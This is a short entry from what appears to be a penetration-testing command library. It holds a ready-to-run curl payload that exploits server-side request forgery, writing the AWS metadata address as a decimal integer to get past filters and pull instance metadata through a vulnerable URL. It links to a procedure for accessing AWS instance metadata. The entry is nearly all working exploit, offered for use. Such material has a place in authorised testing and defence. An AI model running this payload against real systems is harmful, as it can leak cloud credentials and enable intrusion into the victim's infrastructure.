---
type: command
executor: bash
data: 'curl "$_VULN_URL?target=http://2852039166/latest/meta-data/" -v'
output: null
created_at: '2023-04-06T03:56:38Z'
updated_at: '2023-04-10T20:23:59Z'
platforms:
  - Web
  - AWS
tags:
  - ssrf
  - decimal-bypass
verified: true
validated: true
---

# curl-decimal-ip-bypass

## Command

```bash
curl "$_VULN_URL?target=http://2852039166/latest/meta-data/" -v
```

## Description

Decimal IP bypass for 169.254.169.254.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_VULN_URL | Vulnerable URL | Yes |

## Examples

### Basic Usage

As shown.

## Expected Output

Metadata.

## Related

- [[procedures/Exploit-SSRF-to-Access-AWS-Instance-Metadata]]
